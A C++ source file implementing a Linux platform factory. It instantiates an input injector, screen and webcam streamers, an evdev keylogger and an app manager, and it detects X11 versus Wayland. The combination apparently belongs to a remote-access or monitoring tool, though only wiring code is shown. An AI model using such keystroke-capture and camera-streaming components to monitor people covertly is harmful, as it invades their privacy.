#ifdef PLATFORM_LINUX

#include "LinuxPlatformFactory.hpp"
#include "LinuxInputInjectorFactory.hpp"
#include "LinuxX11Streamer.hpp"
#include "LinuxWebcamStreamer.hpp"
#include "LinuxEvdevLogger.hpp"
#include "LinuxAppManager.hpp"
#include <iostream>
#include <cstdlib>

namespace platform {
namespace linux_platform {

// ============================================================================
// Factory Method Implementations
// ============================================================================

std::unique_ptr<interfaces::IInputInjector> LinuxPlatformFactory::create_input_injector() {
    // Use the existing factory which handles X11 vs uinput detection
    return LinuxInputInjectorFactory::create();
}

std::unique_ptr<interfaces::IVideoStreamer> LinuxPlatformFactory::create_screen_streamer() {
    // TODO: Add Wayland support (e.g., pipewire screencopy)
    // For now, use X11 streamer
    return std::make_unique<LinuxX11Streamer>();
}

std::unique_ptr<interfaces::IVideoStreamer> LinuxPlatformFactory::create_webcam_streamer() {
    return std::make_unique<LinuxWebcamStreamer>();
}

std::unique_ptr<interfaces::IKeylogger> LinuxPlatformFactory::create_keylogger() {
    return std::make_unique<LinuxEvdevLogger>();
}

std::unique_ptr<interfaces::IAppManager> LinuxPlatformFactory::create_app_manager() {
    return std::make_unique<LinuxAppManager>();
}

// ============================================================================
// Lifecycle
// ============================================================================

void LinuxPlatformFactory::initialize() {
    if (initialized_) return;

    std::cout << "[LinuxPlatform] Initializing..." << std::endl;

    // Detect display server
    const char* wayland_display = std::getenv("WAYLAND_DISPLAY");
    const char* xdg_session = std::getenv("XDG_SESSION_TYPE");

    is_wayland_ = (wayland_display != nullptr) ||
                  (xdg_session && std::string(xdg_session) == "wayland");

    if (is_wayland_) {
        std::cout << "[LinuxPlatform] Wayland detected" << std::endl;
    } else {
        std::cout << "[LinuxPlatform] X11 detected" << std::endl;
    }

    initialized_ = true;
    std::cout << "[LinuxPlatform] Ready" << std::endl;
}

void LinuxPlatformFactory::shutdown() {
    if (!initialized_) return;

    std::cout << "[LinuxPlatform] Shutting down..." << std::endl;

    // Linux-specific cleanup

    initialized_ = false;
}

} // namespace linux_platform
} // namespace platform

#endif // PLATFORM_LINUX
